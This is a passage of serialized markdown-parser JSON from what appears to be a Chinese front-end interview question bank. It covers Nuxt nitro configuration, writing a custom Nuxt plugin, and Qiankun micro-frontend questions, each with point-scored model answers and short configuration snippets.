会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。\\n```","lang":"js","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: \'node-server\'\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: \'serverless\'，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","task":false,"loose":false,"text":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","tokens":[{"type":"text","raw":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","text":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","text":" routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      \'/\': {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      \'/about\': {\\n        redirect: {\\n          destination: \'/\', // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      \'/api/data\': {\\n        headers: {\\n          \'Access-Control-Allow-Origin\': \'*\' // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      \'/\': {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      \'/about\': {\\n        redirect: {\\n          destination: \'/\', // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      \'/api/data\': {\\n        headers: {\\n          \'Access-Control-Allow-Origin\': \'*\' // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","task":false,"loose":false,"text":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","tokens":[{"type":"text","raw":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n\\n开发环境下顺畅地协同工作。","text":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","text":" devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      \'/api\': {\\n        target: \'http://localhost:3000/api\', // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      \'/api\': {\\n        target: \'http://localhost:3000/api\', // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","task":false,"loose":false,"text":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","tokens":[{"type":"text","raw":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n\\n要求，精准地定制构建结果的呈现形式。","text":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","text":" output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: \'dist\', // 设置构建输出目录为 dist\\n      publicDir: \'public\', // 设定公共资源目录为 public\\n      format: \'esm\' // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: \'dist\', // 设置构建输出目录为 dist\\n      publicDir: \'public\', // 设定公共资源目录为 public\\n      format: \'esm\' // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","task":false,"loose":false,"text":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","tokens":[{"type":"text","raw":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","text":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","text":" plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [\'./server/plugins/myPlugin.ts\']\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [\'./server/plugins/myPlugin.ts\']\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？\\n\\n","depth":2,"text":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","tokens":[{"type":"text","raw":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","text":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。\\n* **2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。\\n","task":false,"loose":false,"text":"**3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","tokens":[{"type":"text","raw":"**3：** Nuxt 插件的作用<br/>\\n\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n\\n适配不同的环境和满足特定的需求。","text":"**3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]},{"type":"text","raw":" Nuxt 插件的作用","text":" Nuxt 插件的作用","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。","text":"\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。","text":"\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","text":"\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","task":false,"loose":false,"text":"**2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","tokens":[{"type":"text","raw":"**2：** 编写一个自定义插件<br/>\\n\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","text":"**2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 编写一个自定义插件","text":" 编写一个自定义插件","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。","text":"\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","text":"\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nexport default function (context, inject) {\\n  const myLogger = (message) => {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(\'myLogger\', myLogger);\\n}\\n```","lang":"js","text":"export default function (context, inject) {\\n  const myLogger = (message) => {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(\'myLogger\', myLogger);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"Qiankun","content":"<h1>Qiankun</h1>\\n<h2>当前主流的微前端方案大概有哪些？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>1：</strong> iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。</li>\\n<li><strong>1：</strong> single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。</li>\\n<li><strong>1：</strong> qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。</li>\\n<li><strong>1：</strong> micro-app：基于 Webcomponent 的微前端方案，由京东出品。</li>\\n<li><strong>1：</strong> EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。</li>\\n<li><strong>1：</strong> 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生</li>\\n</ul>\\n<h2>Qiankun 有哪些优点？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。</li>\\n<li><strong>1：</strong> 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。</li>\\n<li><strong>1：</strong> 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。</li>\\n<li><strong>1：</strong> 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。</li>\\n</ul>\\n<h2>Qiankun 如何实现子应用的加载？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。</li>\\n</ul>\\n<h2>Qiankun 如何处理子应用之间的公共依赖？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Qiankun\\n\\n","depth":1,"text":"Qiankun","tokens":[{"type":"text","raw":"Qiankun","text":"Qiankun","escaped":false}]},{"type":"heading","raw":"## 当前主流的微前端方案大概有哪些？\\n\\n","depth":2,"text":"当前主流的微前端方案大概有哪些？","tokens":[{"type":"text","raw":"当前主流的微前端方案大概有哪些？","text":"当前主流的微前端方案大概有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。\\n- **1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。\\n- **1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。\\n- **1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。\\n- **1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。\\n- **1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。\\n","task":false,"loose":false,"text":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","tokens":[{"type":"text","raw":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","text":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","text":" iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。\\n","task":false,"loose":false,"text":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","tokens":[{"type":"text","raw":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","text":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","text":" 